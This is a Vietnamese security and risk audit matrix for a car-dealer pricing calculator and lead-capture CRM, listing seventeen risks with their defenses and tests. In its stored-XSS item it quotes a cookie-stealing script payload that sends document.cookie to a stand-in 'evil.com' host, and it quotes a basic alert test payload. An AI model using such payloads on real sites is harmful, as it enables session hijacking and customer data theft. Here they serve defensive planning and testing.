# 🛡️ Báo Cáo Ma Trận Kiểm Toán Rủi Ro & An Ninh (Security & Risk Audit Matrix)
## PHASE 3 - PRICING & LEAD ENGINE (`EPIC-PHASE-3-PRICING-LEAD`)

> **Chuyên gia thực hiện:** `qa-security-specialist` & `system-analyst-architect`  
> **Trạng thái:** Hoàn thành kiểm toán toàn diện 17 điểm rủi ro (R1–R17)  
> **Áp dụng cho:** Core Pricing Engine, Lead Capture Funnel, Public Ingestion API, Admin CRM Management

---

## 1. Tổng Quan Ma Trận Rủi Ro (Risk Overview Heatmap)

| Mức Độ Nghiêm Trọng | Số Lượng | Mã Rủi Ro |
| :--- | :---: | :--- |
| 🔴 **CRITICAL** (Tối khẩn) | 4 | **R1, R2, R3, R4** |
| 🟠 **HIGH** (Cao) | 6 | **R5, R6, R7, R8, R9, R10** |
| 🟡 **MEDIUM** (Trung bình) | 5 | **R11, R12, R13, R14, R15** |
| 🟢 **LOW** (Thấp) | 2 | **R16, R17** |

---

## 2. Chi Tiết Ma Trận Kiểm Toán 17 Điểm Rủi Ro (R1 – R17)

---

### 🔴 NHÓM CRITICAL (Rủi ro Tối Khẩn - Đe dọa Toàn Vẹn Hệ Thống & Dữ Liệu)

#### R1: Tấn Công Spam Bot Làm Tràn Dữ Liệu Lead (Lead Flooding & Resource Exhaustion)
* **Kịch bản tấn công:** Tin tặc hoặc đối thủ dùng script tự động gửi hàng ngàn request mỗi phút vào endpoint công khai `POST /api/leads` với thông tin rác.
* **Hậu quả:** Làm cạn kiệt tài nguyên cơ sở dữ liệu (Connection pool & Disk space), khiến bảng leads của nhân viên kinh doanh bị ngập rác, bỏ lỡ khách hàng thật.
* **Giải pháp phòng thủ (Defenses):**
  1. **Sliding Window Rate Limiter:** Giới hạn tối đa 5 requests / phút trên mỗi địa chỉ IP (sử dụng in-memory LRU cache hoặc Redis). Vượt ngưỡng trả về `429 Too Many Requests`.
  2. **Zero-Cost Honeypot Field:** Thêm một trường ẩn `website_url` trong Form. Nếu bot tự động điền giá trị vào trường này, hệ thống âm thầm ghi nhận giả định thành công nhưng **không lưu vào DB** (`silent discard`).
  3. **Payload Size Guard:** Giới hạn body kích thước request `POST /api/leads` tối đa 10KB.
* **Phương thức kiểm thử:** Viết Integration Test gửi 10 requests liên tiếp trong 2 giây từ cùng 1 client; request thứ 6 phải nhận HTTP `429`.

---

#### R2: Dữ Liệu Số Điện Thoại Rác & Cố Tình Phá Hoại (Phone Number Pollution)
* **Kịch bản rủi ro:** Khách hàng hoặc đối thủ nhập chuỗi ký tự ngẫu nhiên (`asdfghjk`), số ảo trùng lặp (`0900000000`, `0988888888`), hoặc chèn payload SQL/script vào ô số điện thoại.
* **Hậu quả:** Sales tốn thời gian gọi vào các số không có thật; nguy cơ SQL Injection nếu câu truy vấn không dùng tham số hóa.
* **Giải pháp phòng thủ (Defenses):**
  1. **Strict 10-Digit VN Phone Regex:** Bắt buộc khớp định dạng di động Việt Nam: `/^(03|05|07|08|09)\d{8}$/` (10 chữ số chuẩn các nhà mạng Viettel, VinaPhone, MobiFone, Vietnamobile, I-Telecom/Wintel).
  2. **Pattern Blacklist Filter:** Chặn các dải số rác lặp lại hoặc tăng dần kinh điển (`0900000000`, `0912345678`, `0999999999`, `0988888888`).
  3. **Zero-Cost Code Validation:** Xử lý 100% bằng logic mã nguồn (Zod Schema & Regex), cam kết không phát sinh bất kỳ chi phí viễn thông/SMS nào.
* **Phương thức kiểm thử:** Test Suite với 20 số điện thoại không hợp lệ (9 số, 11 số, chữ cái, đầu số cố định cũ, dải số blacklist) phải bị từ chối với lỗi `400 BAD_REQUEST`.

---

#### R3: Gửi Trùng Lặp Do Nhấn Đúp Hoặc Mạng Chậm (Duplicate Submission Race Condition)
* **Kịch bản rủi ro:** Người dùng trên điện thoại mạng yếu nhấn nút "GỬI YÊU CẦU" nhiều lần liên tiếp, hoặc người dùng gửi lại yêu cầu tính giá cùng một xe trong vòng vài phút.
* **Hậu quả:** Tạo ra 2-3 bản ghi trùng lặp trong hệ thống CRM, 2 nhân viên sales cùng gọi cho 1 khách hàng gây phiền hà.
* **Giải pháp phòng thủ (Defenses):**
  1. **Client-Side Debounce & Button Lock:** Nút gửi tự động disabled ngay sau cú click đầu tiên, hiển thị trạng thái loading spinner.
  2. **Idempotency Window (Deduplication Guard):** Server kiểm tra nếu cùng 1 `phone` gửi yêu cầu cho cùng 1 `carVersionId` trong vòng **10 phút**, hệ thống sẽ cập nhật `notes` của lead cũ thay vì tạo record mới, hoặc trả về mã thành công kèm flag `isDuplicate: true`.
  3. **Database Unique Composite Constraint / Index:** Hỗ trợ truy vấn nhanh lịch sử lead theo số điện thoại: `CREATE INDEX idx_leads_phone_created ON leads(phone, created_at DESC)`.
* **Phương thức kiểm thử:** Gửi 2 request giống hệt nhau trong vòng 100ms; DB chỉ được ghi nhận 1 lead duy nhất.

---

#### R4: Lỗ Hổng Bảo Mật Rò Rỉ Dữ Liệu Khách Hàng CRM (Broken Access Control - BOLA)
* **Kịch bản tấn công:** Kẻ xấu đoán URL API `GET /api/admin/leads` hoặc `GET /api/admin/leads/:id` mà không có token hoặc dùng tài khoản `editor` để tải trọn bộ danh sách số điện thoại khách hàng.
* **Hậu quả:** Rò rỉ danh sách khách hàng có nhu cầu mua xe thật cho đối thủ kinh doanh, vi phạm nghiêm trọng quy định bảo vệ dữ liệu cá nhân.
* **Giải pháp phòng thủ (Defenses):**
  1. **Strict RBAC Middleware:** Chỉ các tài khoản có role `admin`, `sales`, `manager` mới được phép truy cập namespace `/api/admin/leads/*`. Role `editor` bị từ chối `403 FORBIDDEN`.
  2. **Public Endpoint Segregation:** API công khai (`/api/leads`) TUYỆT ĐỐI KHÔNG hỗ trợ phương thức `GET` (không bao giờ trả về danh sách lead ra ngoài).
  3. **Audit Log:** Mọi thao tác xem chi tiết hoặc xuất danh sách lead đều được ghi nhật ký (Audit Log) kèm User ID và IP truy cập.
* **Phương thức kiểm thử:** Test Suite gọi `GET /api/admin/leads` bằng: (a) Không có token -> `401`, (b) Token role `editor` -> `403`, (c) Token role `sales` -> `200`.

---

### 🟠 NHÓM HIGH (Rủi ro Nghiệp Vụ & Độ Chính Xác Cao)

#### R5: Sai Số Dấu Phẩy Động Trong Tính Toán Tiền Tệ (Floating Point Inaccuracy)
* **Kịch bản rủi ro:** Tính phí trước bạ `769.000.000 * 0.1` hoặc chia lãi suất ngân hàng `(7.9 / 100 / 12) * loanAmount` trong JavaScript bị lỗi dấu phẩy động (ví dụ: `76900000.00000001` hoặc `14320000.499999999`).
* **Hậu quả:** Giao diện hiển thị số tiền lẻ kỳ quặc, làm mất vẻ chuyên nghiệp của thương hiệu ô tô cao cấp.
* **Giải pháp phòng thủ (Defenses):**
  1. **Integer Arithmetic (Số nguyên VNĐ):** Toàn bộ kết quả tính toán chi phí và lãi suất đều được làm tròn về số nguyên bằng `Math.round()` hoặc `Math.floor()`.
  2. **Pure Deterministic Function:** Hàm tính toán trong `packages/core/src/pricing/` không phụ thuộc vào I/O hay side-effects, có unit test bao phủ sai số tuyệt đối = 0 đồng.
* **Phương thức kiểm thử:** Chạy test suite với 50 mức giá xe niêm yết từ 300 triệu đến 5 tỷ VNĐ; tất cả kết quả đầu ra phải là số nguyên dương (`Number.isInteger(result.total) === true`).

---

#### R6: Tham Số Giá Trị Âm Hoặc Vượt Biên Gây Treo Ứng Dụng (Negative & Overflow Inputs)
* **Kịch bản rủi ro:** Người dùng can thiệp URL hoặc gửi payload trực tiếp với giá trị âm (ví dụ: `giaNiemYet = -500000000`, `loanTermMonths = 0`, `downPaymentPercentage = 150%`).
* **Hậu quả:** Gây lỗi chia cho 0 (`Division by Zero`), trả về `NaN`, `Infinity` hoặc số tiền âm khiến giao diện bị crash.
* **Giải pháp phòng thủ (Defenses):**
  1. **Strict Zod Boundary Validation:**
     * `giaNiemYet >= 100_000_000` (Tối thiểu 100 triệu VNĐ)
     * `downPaymentPercentage`: `min: 10`, `max: 90`
     * `loanTermMonths`: `min: 12`, `max: 96` (1 đến 8 năm)
     * `annualInterestRate`: `min: 0`, `max: 30` (0% đến 30%/năm)
  2. **Engine Guard Fallback:** Các hàm core tự động ném `RangeError` hoặc trả về giá trị an toàn nếu tham số nằm ngoài biên.
* **Phương thức kiểm thử:** Unit test truyền các bộ tham số biên: `-1`, `0`, `999999999999`, `NaN`, `null`; đảm bảo engine xử lý graceful không crash.

---

#### R7: Biểu Phí Nhà Nước Thay Đổi Nhưng Bị Hardcode Rải Rác (Stale Regulatory Fee Schedules)
* **Kịch bản rủi ro:** Chính phủ ban hành nghị định giảm 50% lệ phí trước bạ ô tô sản xuất trong nước, hoặc thành phố điều chỉnh phí cấp biển số. Do biểu phí bị hardcode ở nhiều component, dev sửa sót gây sai lệch thông tin.
* **Hậu quả:** Khách hàng khiếu nại báo giá sai so với chính sách thực tế của nhà nước.
* **Giải pháp phòng thủ (Defenses):**
  1. **Centralized Configuration Object:** Toàn bộ hằng số biểu phí được quản lý tập trung duy nhất tại `packages/core/src/pricing/config.ts`:
     * Phí trước bạ theo tỉnh thành: Vinh (10%), Hà Nội (12%),...
     * Phí cấp biển số: Vinh (1.000.000 VNĐ), Huyện khác (200.000 VNĐ).
     * Phí đăng kiểm: 140.000 VNĐ (ô tô con).
     * Phí bảo trì đường bộ: 1.560.000 VNĐ / năm.
     * Bảo hiểm TNDS: 480.000 VNĐ (xe dưới 6 chỗ không kinh doanh).
  2. **Versioned Config:** Hỗ trợ cấu hình thời hạn áp dụng chính sách giảm thuế nếu cần.
* **Phương thức kiểm thử:** Kiểm tra kiến trúc code: Không có bất kỳ con số hardcode biểu phí nào nằm ngoài file `config.ts`.

---

#### R8: Tấn Công XSS Lưu Trữ Qua Tên Khách Hàng Hoặc Ghi Chú (Stored XSS in CRM)
* **Kịch bản tấn công:** Người dùng nhập tên `"<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"` hoặc chèn iframe độc hại vào ô Họ Tên / Ghi chú tư vấn.
* **Hậu quả:** Khi nhân viên Sales hoặc Quản trị viên mở bảng CRM hoặc Drawer để xem lead, mã độc thực thi trong phiên đăng nhập của Admin, chiếm đoạt token quản trị.
* **Giải pháp phòng thủ (Defenses):**
  1. **Backend Input Sanitization:** Làm sạch dữ liệu, loại bỏ ký tự HTML đặc biệt bằng Zod preprocess hoặc thư viện DOMPurify.
  2. **React JSX Auto-Escaping:** Không sử dụng `dangerouslySetInnerHTML` khi render tên khách hàng hay ghi chú trong `LeadTable.tsx` và `LeadDetailDrawer.tsx`.
  3. **Strict Content-Security-Policy (CSP):** Cấm thực thi inline script không có nonce.
* **Phương thức kiểm thử:** Gửi payload XSS kinh điển `<script>alert('xss')</script>` vào `fullName`; kiểm tra trang CRM hiển thị đúng dạng chuỗi text thuần, không kích hoạt alert.

---

#### R9: Phiên Bản Xe Không Tồn Tại Hoặc Không Có Giá Niêm Yết (Ghost Version Discrepancy)
* **Kịch bản rủi ro:** Dữ liệu xe và phiên bản bị sửa hoặc xóa trong Admin trong lúc khách hàng đang mở trang tính giá; hoặc phiên bản đang ở trạng thái `draft` / chưa cập nhật `giaNiemYet`.
* **Hậu quả:** Máy tính giá hiển thị `0 VNĐ` hoặc ném lỗi ngoại lệ khi người dùng bấm Tính giá lăn bánh.
* **Giải pháp phòng thủ (Defenses):**
  1. **Published Status Filter:** Storefront API chỉ trả về các dòng xe và phiên bản có `status === 'published'` và `giaNiemYet > 0`.
  2. **Disabled CTA on Zero Price:** Nút "TÍNH GIÁ LĂN BÁNH" bị disabled nếu `selectedVersionGia <= 0` kèm thông báo *"Phiên bản này đang cập nhật giá"*.
* **Phương thức kiểm thử:** Tạo phiên bản xe test có giá = null; kiểm tra UI vô hiệu hóa nút tính giá lăn bánh đúng quy định.

---

#### R10: Mất Yêu Cầu Của Khách Hàng Do Mạng Di Động Chập Chờn (Mobile Network Dropped Lead)
* **Kịch bản rủi ro:** Khách hàng đang ngồi trên xe hoặc vùng sóng yếu nhấn gửi báo giá, kết nối 4G bị ngắt giữa chừng, form báo lỗi và khách đóng trình duyệt bỏ đi.
* **Hậu quả:** Mất đi một cơ hội bán hàng (Lost Lead) rất có giá trị trong ngành ô tô.
* **Giải pháp phòng thủ (Defenses):**
  1. **Local State Retention:** Không xóa dữ liệu form khi gửi thất bại.
  2. **Offline Toast Notification:** Báo lỗi rõ ràng kèm nút "Thử lại ngay" (Retry Button) mà không bắt người dùng nhập lại từ đầu.
  3. **Timeout Configuration:** Thiết lập timeout của client API call hợp lý (8 giây) kèm cơ chế retry 1 lần tự động nếu gặp lỗi `NetworkError`.
* **Phương thức kiểm thử:** Kích hoạt chế độ Offline trong Chrome DevTools khi bấm Gửi; kiểm tra form không bị xóa trắng và hiển thị thông báo thân thiện.

---

### 🟡 NHÓM MEDIUM (Rủi ro Vận Hành & Trải Nghiệm Người Dùng)

#### R11: Mất Trạng Thái Khi Tải Lại Trang F5 (F5 Funnel State Loss)
* **Kịch bản rủi ro:** Khách hàng đã nhập xong thông tin ở Bước 1 hoặc đã mở khóa Bước 3, vô tình bấm F5 / kéo tải lại trang trên điện thoại; trình duyệt reset về Bước 1 trắng tinh.
* **Hậu quả:** Gây ức chế trải nghiệm; khách hàng phải chọn lại từ đầu hoặc tưởng tính năng bị lỗi.
* **Giải pháp phòng thủ (Defenses):**
  1. **SessionStorage Persistence:** Lưu trạng thái hiện tại (`state`, `dongXe`, `phienBan`, `tinhThanh`, `calculatedResult`) vào `sessionStorage`.
  2. **Graceful Rehydration:** Khi component mount, nếu phát hiện session hợp lệ thì khôi phục ngay trạng thái mà không cần người dùng nhập lại.
* **Phương thức kiểm thử:** Chuyển sang State `gate` và `success`, refresh trình duyệt; kiểm tra trạng thái và số liệu tính toán vẫn được giữ nguyên vẹn.

---

#### R12: Xung Đột Ghi Đè Khi 2 Nhân Viên Sales Cùng Cập Nhật 1 Lead (Concurrent Edit Conflict)
* **Kịch bản rủi ro:** Khách hàng mới gửi về, 2 nhân viên Sales cùng lúc mở thông tin khách hàng và cùng bấm đổi trạng thái hoặc ghi chú khác nhau.
* **Hậu quả:** Ghi chú của nhân viên này ghi đè làm mất ghi chú của nhân viên kia mà không hay biết.
* **Giải pháp phòng thủ (Defenses):**
  1. **Optimistic Concurrency Check:** Bảng `leads` có trường `updatedAt`. Khi cập nhật, đối chiếu thời gian sửa đổi gần nhất; nếu phát hiện bị sửa bởi người khác thì cảnh báo cho nhân viên.
  2. **Append-Only Sales Notes History:** Lưu ghi chú dưới dạng mảng JSON các mẩu ghi chú có kèm timestamp và tên nhân viên tạo thay vì 1 ô text duy nhất.
* **Phương thức kiểm thử:** Giả lập 2 request update đồng thời; đảm bảo không làm mất dữ liệu lịch sử ghi chú.

---

#### R13: Suy Giảm Hiệu Năng Bảng CRM Khi Dữ Liệu Tăng Lớn (Datatable Performance Degradation)
* **Kịch bản rủi ro:** Sau 6 tháng vận hành, showroom thu thập được 10.000+ leads. Truy vấn `SELECT * FROM leads` không có phân trang gây nghẽn RAM server và đơ trình duyệt Admin.
* **Hậu quả:** Trang quản lý tải chậm (> 5 giây), nhân viên không kịp phản hồi khách hàng mới.
* **Giải pháp phòng thủ (Defenses):**
  1. **Server-Side Pagination:** Bắt buộc phân trang với `page` và `limit` (mặc định 20 bản ghi, tối đa 50).
  2. **Compound Indexing:** Tạo composite index `(status, created_at DESC)` và `(phone)` phục vụ bộ lọc tìm kiếm tốc độ cao (< 50ms).
* **Phương thức kiểm thử:** Benchmark truy vấn với 20.000 bản ghi mẫu trong DB; thời gian phản hồi của API `GET /api/admin/leads` phải < 100ms.

---

#### R14: Lỗi Cú Pháp Dữ Liệu Cấu Trúc SEO JSON-LD (SEO Rich Snippet Invalidation)
* **Kịch bản rủi ro:** Trang `/gia-lan-banh` nhúng thẻ JSON-LD chứa ký tự xuống dòng hoặc nháy kép không escape, làm hỏng cú pháp schema.
* **Hậu quả:** Google Search Console báo lỗi, không được hiển thị Rich Snippets (công cụ tính toán) trên kết quả tìm kiếm Google.
* **Giải pháp phòng thủ (Defenses):**
  1. **Typed Schema Object:** Định nghĩa JSON-LD thông qua đối tượng TypeScript chuẩn `SoftwareApplication` / `FinanceApplication`.
  2. **Safe Serialization:** Sử dụng `JSON.stringify()` chuẩn hóa trước khi render vào script tag.
* **Phương thức kiểm thử:** Kiểm tra mã nguồn trang web qua công cụ Google Rich Results Test đảm bảo 0 lỗi cảnh báo.

---

#### R15: Chặn Nhầm Đầu Số Di Động Mới Hợp Pháp Của Các Nhà Mạng (Overly Strict Regex)
* **Kịch bản rủi ro:** Các nhà mạng ảo (MVNO) như Wintel (đầu 055), FPT (đầu 0775) hoặc các dải số mới được Bộ Thông tin & Truyền thông cấp phép bị regex cũ chặn lại.
* **Hậu quả:** Khách hàng dùng số điện thoại thật nhưng không thể gửi yêu cầu báo giá.
* **Giải pháp phòng thủ (Defenses):**
  1. **Full Prefix Coverage:** Regex bao quát toàn bộ 5 đầu số chuẩn quốc gia: `03x`, `05x`, `07x`, `08x`, `09x`.
  2. **Up-to-date Prefix Test Suite:** Bộ test case bao gồm đầy đủ danh sách tiền tố thực tế của Viettel, VinaPhone, MobiFone, Vietnamobile, Gmobile và Wintel.
* **Phương thức kiểm thử:** Unit test với 30 đầu số thực tế của tất cả các nhà mạng Việt Nam hiện hành; 100% phải pass kiểm tra.

---

### 🟢 NHÓM LOW (Rủi ro Giao Diện & Tuân Thủ Pháp Lý Nhẹ)

#### R16: Nút Bấm Sticky Bị Che Khuất Bởi Thanh Điều Hướng Di Động (Mobile Viewport Clashing)
* **Kịch bản rủi ro:** Trên iPhone (Safari) có thanh URL động hoặc nút home ảo che mất nút bấm "TÍNH GIÁ LĂN BÁNH" đang ghim cố định ở đáy.
* **Hậu quả:** Người dùng khó bấm hoặc phải cuộn tới lui mới bấm được.
* **Giải pháp phòng thủ (Defenses):**
  1. **CSS Safe-Area-Inset:** Sử dụng `pb-[env(safe-area-inset-bottom,16px)]` trên container sticky bar.
  2. **Z-Index Layering:** Đảm bảo `z-index: 40` không bị đè bởi footer nhưng không đè lên modal/dialog (`z-50`).
* **Phương thức kiểm thử:** Kiểm tra trực quan trên trình giả lập mobile (iPhone SE, iPhone 14 Pro, Samsung Galaxy) trong Chrome DevTools.

---

#### R17: Thiếu Thông Cáo Minh Bạch Quyền Riêng Tư Dữ Liệu (Privacy Policy Transparency)
* **Kịch bản rủi ro:** Khách hàng e ngại để lại số điện thoại vì sợ bị bán dữ liệu cho bên thứ ba hoặc bị gọi spam làm phiền.
* **Hậu quả:** Tỷ lệ bỏ ngang tại Bước 2 (Gate) tăng cao, làm giảm chuyển đổi.
* **Giải pháp phòng thủ (Defenses):**
  1. **Trust-Building Micro-copy:** Đặt dòng cam kết bảo mật rõ ràng ngay dưới nút CTA đỏ: *"🔒 Cam kết bảo mật thông tin tuyệt đối - Chỉ sử dụng để gửi báo giá ưu đãi từ Đại lý chính hãng"*.
* **Phương thức kiểm thử:** Đánh giá độ rõ ràng và khả năng đọc của thông điệp trên cả màn hình desktop và mobile.
